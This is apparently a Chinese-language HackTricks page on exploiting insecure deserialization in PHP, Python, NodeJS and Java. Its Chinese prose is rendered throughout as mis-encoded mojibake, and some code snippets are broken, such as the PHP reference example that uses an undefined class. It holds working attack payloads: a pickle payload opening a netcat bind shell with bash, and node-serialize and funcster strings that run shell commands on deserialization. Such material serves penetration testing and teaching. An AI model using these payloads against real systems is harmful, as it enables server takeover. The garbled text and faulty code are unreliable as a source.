# ååºåˆ—åŒ–

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


## åŸºæœ¬ä¿¡æ¯

**åºåˆ—åŒ–**æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå¯ä¿å­˜çš„æ ¼å¼çš„æ–¹æ³•ï¼Œç›®çš„æ˜¯å°†å¯¹è±¡å­˜å‚¨æˆ–ä½œä¸ºé€šä¿¡è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ä¼ è¾“ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºç¡®ä¿å¯¹è±¡å¯ä»¥åœ¨ä»¥åçš„æŸä¸ªæ—¶é—´é‡æ–°åˆ›å»ºï¼Œä¿æŒå…¶ç»“æ„å’ŒçŠ¶æ€ã€‚

**ååºåˆ—åŒ–**ç›¸åï¼Œæ˜¯å¯¹æŠ—åºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚å®ƒæ¶‰åŠå°†ä»¥ç‰¹å®šæ ¼å¼ç»“æ„åŒ–çš„æ•°æ®é‡æ–°æ„å»ºä¸ºå¯¹è±¡ã€‚

ååºåˆ—åŒ–å¯èƒ½å¾ˆå±é™©ï¼Œå› ä¸ºå®ƒæ½œåœ¨åœ°**å…è®¸æ”»å‡»è€…æ“çºµåºåˆ—åŒ–æ•°æ®ä»¥æ‰§è¡Œæœ‰å®³ä»£ç **æˆ–åœ¨å¯¹è±¡é‡å»ºè¿‡ç¨‹ä¸­å¯¼è‡´åº”ç”¨ç¨‹åºå‡ºç°æ„å¤–è¡Œä¸ºã€‚


## PHP

åœ¨PHPä¸­ï¼Œåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä½¿ç”¨äº†ç‰¹å®šçš„é­”æœ¯æ–¹æ³•ï¼š

* `__sleep`ï¼šåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚æ­¤æ–¹æ³•åº”è¿”å›ä¸€ä¸ªåŒ…å«åº”è¯¥è¢«åºåˆ—åŒ–çš„å¯¹è±¡æ‰€æœ‰å±æ€§åç§°çš„æ•°ç»„ã€‚é€šå¸¸ç”¨äºæäº¤æŒ‚èµ·æ•°æ®æˆ–æ‰§è¡Œç±»ä¼¼çš„æ¸…ç†ä»»åŠ¡ã€‚
* `__wakeup`ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚ç”¨äºé‡æ–°å»ºç«‹åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯èƒ½ä¸¢å¤±çš„ä»»ä½•æ•°æ®åº“è¿æ¥å¹¶æ‰§è¡Œå…¶ä»–é‡æ–°åˆå§‹åŒ–ä»»åŠ¡ã€‚
* `__unserialize`ï¼šå½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœå­˜åœ¨æ­¤æ–¹æ³•ï¼Œåˆ™è°ƒç”¨å®ƒè€Œä¸æ˜¯`__wakeup`ã€‚ä¸`__wakeup`ç›¸æ¯”ï¼Œå®ƒå¯¹ååºåˆ—åŒ–è¿‡ç¨‹æä¾›äº†æ›´å¤šæ§åˆ¶ã€‚
* `__destruct`ï¼šå½“å¯¹è±¡å³å°†è¢«é”€æ¯æˆ–è„šæœ¬ç»“æŸæ—¶è°ƒç”¨æ­¤æ–¹æ³•ã€‚é€šå¸¸ç”¨äºæ¸…ç†ä»»åŠ¡ï¼Œå¦‚å…³é—­æ–‡ä»¶å¥æŸ„æˆ–æ•°æ®åº“è¿æ¥ã€‚
* `__toString`ï¼šæ­¤æ–¹æ³•å…è®¸å°†å¯¹è±¡è§†ä¸ºå­—ç¬¦ä¸²ã€‚å®ƒå¯ç”¨äºæ ¹æ®å…¶ä¸­çš„å‡½æ•°è°ƒç”¨è¯»å–æ–‡ä»¶æˆ–æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œæœ‰æ•ˆåœ°æä¾›å¯¹è±¡çš„æ–‡æœ¬è¡¨ç¤ºã€‚
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
å¦‚æœæ‚¨æŸ¥çœ‹ç»“æœï¼Œæ‚¨ä¼šå‘ç°åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨å‡½æ•°**`__wakeup`**å’Œ**`__destruct`**ã€‚è¯·æ³¨æ„ï¼Œåœ¨ä¸€äº›æ•™ç¨‹ä¸­ï¼Œæ‚¨ä¼šå‘ç°åœ¨å°è¯•æ‰“å°æŸä¸ªå±æ€§æ—¶ä¼šè°ƒç”¨**`__toString`**å‡½æ•°ï¼Œä½†æ˜¾ç„¶**ä¸å†å‘ç”Ÿ**è¿™ç§æƒ…å†µã€‚

{% hint style="warning" %}
å¦‚æœåœ¨ç±»ä¸­å®ç°äº†æ–¹æ³•**`__unserialize(array $data)`**ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥æ–¹æ³•**è€Œä¸æ˜¯`__wakeup()`**ã€‚å®ƒå…è®¸æ‚¨é€šè¿‡æä¾›åºåˆ—åŒ–æ•°æ®ä½œä¸ºæ•°ç»„æ¥ååºåˆ—åŒ–å¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥ååºåˆ—åŒ–å±æ€§å¹¶åœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»»åŠ¡ã€‚
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»ä¸€ä¸ªè§£é‡Š**PHPç¤ºä¾‹**ï¼š[https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)ï¼Œæˆ–è€…åœ¨è¿™é‡Œ[https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf)ï¼Œæˆ–è€…åœ¨è¿™é‡Œ[https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHPååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»

æ‚¨å¯ä»¥æ»¥ç”¨PHPçš„è‡ªåŠ¨åŠ è½½åŠŸèƒ½æ¥åŠ è½½ä»»æ„çš„phpæ–‡ä»¶å’Œæ›´å¤šå†…å®¹ï¼š

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### åºåˆ—åŒ–å¼•ç”¨å€¼

å¦‚æœå‡ºäºæŸç§åŸå› ï¼Œæ‚¨æƒ³å°†ä¸€ä¸ªå€¼åºåˆ—åŒ–ä¸ºå¯¹å¦ä¸€ä¸ªå€¼åºåˆ—åŒ–çš„**å¼•ç”¨**ï¼Œæ‚¨å¯ä»¥ï¼š
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc)å¯ä»¥å¸®åŠ©æ‚¨ç”Ÿæˆç”¨äºæ»¥ç”¨PHPååºåˆ—åŒ–çš„æœ‰æ•ˆè´Ÿè½½ã€‚\
è¯·æ³¨æ„ï¼Œåœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ‚¨**å¯èƒ½æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­æ‰¾åˆ°æ»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•**ï¼Œä½†æ‚¨å¯èƒ½èƒ½å¤Ÿ**æ»¥ç”¨å¤–éƒ¨PHPæ‰©å±•çš„ä»£ç **ã€‚\
å› æ­¤ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çš„`phpinfo()`å¹¶åœ¨äº’è”ç½‘ä¸Šæœç´¢ï¼ˆç”šè‡³åœ¨**PHPGGC**çš„**å°å·¥å…·**ä¸­ï¼‰ä¸€äº›æ‚¨å¯ä»¥æ»¥ç”¨çš„å¯èƒ½å°å·¥å…·ã€‚

### phar:// å…ƒæ•°æ®ååºåˆ—åŒ–

å¦‚æœæ‚¨å‘ç°äº†ä¸€ä¸ªä»…ä»…è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„phpä»£ç çš„LFIï¼Œä¾‹å¦‚ä½¿ç”¨å‡½æ•°å¦‚ _**file\_get\_contents(), fopen(), file() or file\_exists(), md5\_file(), filemtime() or filesize()**_**ã€‚ æ‚¨å¯ä»¥å°è¯•æ»¥ç”¨ä½¿ç”¨**phar**åè®®è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿçš„**ååºåˆ—åŒ–**ã€‚\
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹æ–‡ç« ï¼š

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå°†æ‰§è¡Œå‡½æ•° _\_\_reduce\_\__ã€‚\
å½“è¢«åˆ©ç”¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›é”™è¯¯ã€‚
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
è¦äº†è§£æœ‰å…³é€ƒç¦»**pickle jails**çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ä»¥ä¸‹é¡µé¢ä»‹ç»äº†åœ¨yaml pythonåº“ä¸­**æ»¥ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–**çš„æŠ€æœ¯ï¼Œå¹¶æœ€åæä¾›äº†ä¸€ä¸ªå·¥å…·ï¼Œå¯ç”¨äºç”Ÿæˆ**Pickleã€PyYAMLã€jsonpickleå’Œruamel.yaml**çš„RCEååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼š

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### ç±»æ±¡æŸ“ï¼ˆPythonåŸå‹æ±¡æŸ“ï¼‰

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JSé­”æœ¯å‡½æ•°

JS **æ²¡æœ‰åƒPHPæˆ–Pythoné‚£æ ·ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œçš„"é­”æœ¯"å‡½æ•°**ã€‚ä½†å®ƒæœ‰ä¸€äº›**ç»å¸¸è¢«ä½¿ç”¨ï¼Œå³ä½¿æ²¡æœ‰ç›´æ¥è°ƒç”¨**çš„**å‡½æ•°**ï¼Œæ¯”å¦‚**`toString`**ã€**`valueOf`**ã€**`toJSON`**ã€‚\
å¦‚æœæ»¥ç”¨ååºåˆ—åŒ–ï¼Œæ‚¨å¯ä»¥**ç ´åè¿™äº›å‡½æ•°ä»¥æ‰§è¡Œå…¶ä»–ä»£ç **ï¼ˆæ½œåœ¨åœ°æ»¥ç”¨åŸå‹æ±¡æŸ“ï¼‰ï¼Œä»è€Œåœ¨è°ƒç”¨å®ƒä»¬æ—¶æ‰§è¡Œä»»æ„ä»£ç ã€‚

å¦ä¸€ç§**"é­”æœ¯"è°ƒç”¨å‡½æ•°çš„æ–¹å¼**æ˜¯é€šè¿‡**ç ´åç”±å¼‚æ­¥å‡½æ•°è¿”å›çš„å¯¹è±¡**ï¼ˆpromiseï¼‰ã€‚å› ä¸ºï¼Œå¦‚æœæ‚¨å°†**è¿”å›å¯¹è±¡**è½¬æ¢ä¸ºå¦ä¸€ä¸ªå¸¦æœ‰åä¸º**"then"çš„ç±»å‹ä¸ºå‡½æ•°çš„å±æ€§**çš„**promise**ï¼Œå®ƒå°†è¢«**æ‰§è¡Œ**ï¼Œå› ä¸ºå®ƒæ˜¯ç”±å¦ä¸€ä¸ªpromiseè¿”å›çš„ã€‚_ç‚¹å‡»_ [_**æ­¤é“¾æ¥**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _äº†è§£æ›´å¤šä¿¡æ¯ã€‚_
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` å’Œ `prototype` æ±¡æŸ“

å¦‚æœæ‚¨æƒ³äº†è§£è¿™ä¸ªæŠ€æœ¯ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹æ•™ç¨‹ï¼š

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

è¯¥åº“å…è®¸å¯¹å‡½æ•°è¿›è¡Œåºåˆ—åŒ–ã€‚ç¤ºä¾‹ï¼š
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**åºåˆ—åŒ–å¯¹è±¡**å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
åœ¨ç¤ºä¾‹ä¸­ï¼Œå½“å‡½æ•°è¢«åºåˆ—åŒ–æ—¶ï¼Œä¼šåœ¨åºåˆ—åŒ–å¯¹è±¡åé™„åŠ  `_$$ND_FUNC$$_` æ ‡å¿—ã€‚

åœ¨æ–‡ä»¶ `node-serialize/lib/serialize.js` ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç›¸åŒçš„æ ‡å¿—ä»¥åŠä»£ç å¦‚ä½•ä½¿ç”¨å®ƒã€‚

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

æ­£å¦‚æ‚¨åœ¨æœ€åä¸€æ®µä»£ç ä¸­æ‰€çœ‹åˆ°çš„ï¼Œ**å¦‚æœæ‰¾åˆ°æ ‡å¿—**ï¼Œåˆ™ä¼šä½¿ç”¨ `eval` æ¥ååºåˆ—åŒ–å‡½æ•°ï¼Œå› æ­¤åŸºæœ¬ä¸Š**ç”¨æˆ·è¾“å…¥è¢«ç”¨åœ¨ `eval` å‡½æ•°å†…**ã€‚

ç„¶è€Œï¼Œ**ä»…ä»…åºåˆ—åŒ–**ä¸€ä¸ªå‡½æ•°**ä¸ä¼šæ‰§è¡Œå®ƒ**ï¼Œå› ä¸ºéœ€è¦ä»£ç çš„æŸéƒ¨åˆ†**è°ƒç”¨ `y.rce`**ï¼Œåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­è¿™æ˜¯é«˜åº¦**ä¸å¯èƒ½**çš„ã€‚\
æ— è®ºå¦‚ä½•ï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡**ï¼Œ**æ·»åŠ ä¸€äº›æ‹¬å·**ï¼Œä»¥ä¾¿åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–å‡½æ•°ã€‚\
åœ¨ä¸‹ä¸€æ®µä»£ç ä¸­ï¼Œ**è¯·æ³¨æ„æœ€åçš„æ‹¬å·**ä»¥åŠ `unserialize` å‡½æ•°å°†å¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
å¦‚å…ˆå‰æ‰€è¿°ï¼Œæ­¤åº“å°†åœ¨`_$$ND_FUNC$$_`åè·å–ä»£ç ï¼Œå¹¶ä½¿ç”¨`eval`æ¥**æ‰§è¡Œ**å®ƒã€‚å› æ­¤ï¼Œä¸ºäº†**è‡ªåŠ¨æ‰§è¡Œä»£ç **ï¼Œæ‚¨å¯ä»¥**åˆ é™¤å‡½æ•°åˆ›å»º**éƒ¨åˆ†å’Œæœ€åçš„æ‹¬å·ï¼Œåªéœ€æ‰§è¡Œç±»ä¼¼ä»¥ä¸‹ç¤ºä¾‹ä¸­çš„JS onelinerï¼š
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
æ‚¨å¯ä»¥åœ¨[**è¿™é‡Œ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)æ‰¾åˆ°æœ‰å…³å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´çš„**æ›´å¤šä¿¡æ¯**ã€‚

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**çš„ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„æ–¹é¢æ˜¯**æ ‡å‡†å†…ç½®å¯¹è±¡**çš„ä¸å¯è®¿é—®æ€§ï¼›å®ƒä»¬è¶…å‡ºäº†å¯è®¿é—®èŒƒå›´ã€‚è¿™ç§é™åˆ¶é˜»æ­¢äº†è¯•å›¾è°ƒç”¨å†…ç½®å¯¹è±¡æ–¹æ³•çš„ä»£ç æ‰§è¡Œï¼Œå¯¼è‡´è¯¸å¦‚`"ReferenceError: console is not defined"`çš„å¼‚å¸¸ï¼Œå½“ä½¿ç”¨`console.log()`æˆ–`require(something)`ç­‰å‘½ä»¤æ—¶ã€‚

å°½ç®¡å­˜åœ¨è¿™ç§é™åˆ¶ï¼Œé€šè¿‡ç‰¹å®šæ–¹æ³•å¯ä»¥æ¢å¤å¯¹å…¨å±€ä¸Šä¸‹æ–‡çš„å®Œå…¨è®¿é—®æƒé™ï¼ŒåŒ…æ‹¬æ‰€æœ‰æ ‡å‡†å†…ç½®å¯¹è±¡ã€‚é€šè¿‡ç›´æ¥åˆ©ç”¨å…¨å±€ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç»•è¿‡æ­¤é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç‰‡æ®µé‡æ–°å»ºç«‹è®¿é—®æƒé™ï¼š
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**æ›´å¤šä¿¡æ¯è¯·é˜…è¯»æ­¤æ¥æº**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**ã€‚**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript**è½¯ä»¶åŒ…ä¸“é—¨è®¾è®¡ç”¨äºåºåˆ—åŒ–ç›®çš„ï¼Œç¼ºä¹ä»»ä½•å†…ç½®çš„ååºåˆ—åŒ–åŠŸèƒ½ã€‚ç”¨æˆ·éœ€è¦è‡ªè¡Œå®ç°ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚å®˜æ–¹ç¤ºä¾‹å»ºè®®ç›´æ¥ä½¿ç”¨`eval`æ¥ååºåˆ—åŒ–åºåˆ—åŒ–çš„æ•°æ®ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
å¦‚æœæ­¤å‡½æ•°ç”¨äºååºåˆ—åŒ–å¯¹è±¡ï¼Œåˆ™æ‚¨å¯ä»¥**è½»æ¾åˆ©ç”¨**å®ƒï¼š
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**æ›´å¤šä¿¡æ¯è¯·é˜…è¯»æ­¤æ¥æº**ã€‚

### Cryoåº“

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åº“ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„ä¿¡æ¯ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

åœ¨Javaä¸­ï¼Œ**ååºåˆ—åŒ–å›è°ƒåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œ**ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ç§æ‰§è¡Œæ–¹å¼æ¥æ„é€ æ¶æ„æœ‰æ•ˆè´Ÿè½½ï¼Œè§¦å‘è¿™äº›å›è°ƒï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„æœ‰å®³æ“ä½œæ‰§è¡Œã€‚

### æŒ‡çº¹

#### ç™½ç›’æµ‹è¯•

è¦è¯†åˆ«ä»£ç åº“ä¸­æ½œåœ¨çš„åºåˆ—åŒ–æ¼æ´ï¼Œè¯·æœç´¢ä»¥ä¸‹å†…å®¹ï¼š

* å®ç°`Serializable`æ¥å£çš„ç±»ã€‚
* ä½¿ç”¨`java.io.ObjectInputStream`ï¼Œ`readObject`ï¼Œ`readUnshare`å‡½æ•°ã€‚

ç‰¹åˆ«æ³¨æ„ï¼š

* `XMLDecoder`ä¸å¤–éƒ¨ç”¨æˆ·å®šä¹‰çš„å‚æ•°ä¸€èµ·ä½¿ç”¨ã€‚
* `XStream`çš„`fromXML`æ–¹æ³•ï¼Œç‰¹åˆ«æ˜¯å¦‚æœXStreamç‰ˆæœ¬å°äºæˆ–ç­‰äº1.46ï¼Œåˆ™å®¹æ˜“å—åˆ°åºåˆ—åŒ–é—®é¢˜çš„å½±å“ã€‚
* `ObjectInputStream`ä¸`readObject`æ–¹æ³•ç»“åˆä½¿ç”¨ã€‚
* å®ç°`readObject`ï¼Œ`readObjectNodData`ï¼Œ`readResolve`æˆ–`readExternal`ç­‰æ–¹æ³•ã€‚
* `ObjectInputStream.readUnshared`ã€‚
* é€šç”¨ä½¿ç”¨`Serializable`ã€‚

#### é»‘ç›’æµ‹è¯•

å¯¹äºé»‘ç›’æµ‹è¯•ï¼Œè¯·æŸ¥æ‰¾æŒ‡ç¤ºJavaåºåˆ—åŒ–å¯¹è±¡ï¼ˆæºè‡ª`ObjectInputStream`ï¼‰çš„ç‰¹å®š**ç­¾åæˆ–â€œé­”æ³•å­—èŠ‚â€**ï¼š

* åå…­è¿›åˆ¶æ¨¡å¼ï¼š`AC ED 00 05`ã€‚
* Base64æ¨¡å¼ï¼š`rO0`ã€‚
* HTTPå“åº”å¤´ä¸­`Content-type`è®¾ç½®ä¸º`application/x-java-serialized-object`ã€‚
* æŒ‡ç¤ºå…ˆå‰å‹ç¼©çš„åå…­è¿›åˆ¶æ¨¡å¼ï¼š`1F 8B 08 00`ã€‚
* æŒ‡ç¤ºå…ˆå‰å‹ç¼©çš„Base64æ¨¡å¼ï¼š`H4sIA`ã€‚
* å…·æœ‰`.faces`æ‰©å±•åå’Œ`faces.ViewState`å‚æ•°çš„Webæ–‡ä»¶ã€‚åœ¨Webåº”ç”¨ç¨‹åºä¸­å‘ç°è¿™äº›æ¨¡å¼åº”ä¿ƒä½¿è¿›è¡Œè¯¦ç»†æ£€æŸ¥ï¼Œå¦‚[å…³äºJava JSF ViewState Deserializationçš„å¸–å­](java-jsf-viewstate-.faces-deserialization.md)ä¸­æ‰€è¿°ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¼æ´

å¦‚æœä½ æƒ³äº†è§£**Javaååºåˆ—åŒ–æ¼æ´æ˜¯å¦‚ä½•å·¥ä½œçš„**ï¼Œä½ åº”è¯¥æŸ¥çœ‹[**åŸºæœ¬Javaååºåˆ—åŒ–**](basic-java-deserialization-objectinputstream-readobject.md)ï¼Œ[**Java DNSååºåˆ—åŒ–**](java-dns-deserialization-and-gadgetprobe.md)ï¼Œä»¥åŠ[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ã€‚

#### ç™½ç›’æµ‹è¯•

ä½ å¯ä»¥æ£€æŸ¥æ˜¯å¦å®‰è£…äº†ä»»ä½•å·²çŸ¥æ¼æ´çš„åº”ç”¨ç¨‹åºã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
æ‚¨å¯ä»¥å°è¯•**æ£€æŸ¥æ‰€æœ‰å·²çŸ¥å­˜åœ¨æ¼æ´çš„åº“**ï¼Œå¹¶æŸ¥çœ‹[Ysoserial](https://github.com/frohoff/ysoserial)å¯ä»¥æä¾›æ¼æ´åˆ©ç”¨çš„åº“ã€‚æˆ–è€…æ‚¨å¯ä»¥æ£€æŸ¥[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ä¸ŠæŒ‡å®šçš„åº“ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨[gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector)æ¥æœç´¢å¯èƒ½è¢«åˆ©ç”¨çš„å°å·¥å…·é“¾ã€‚\
